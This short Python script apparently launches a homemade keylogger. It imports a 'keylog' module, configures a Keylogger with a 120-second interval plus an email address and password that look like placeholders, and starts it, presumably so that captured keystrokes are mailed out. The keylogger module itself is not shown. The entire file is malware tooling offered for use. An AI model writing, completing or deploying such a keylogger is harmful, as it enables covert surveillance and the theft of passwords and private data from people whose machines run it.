#!/usr/bin/env pyhton

import keylog

listen = keylog.Keylogger(120, "email@gmail.com", "password@123")
listen.start()
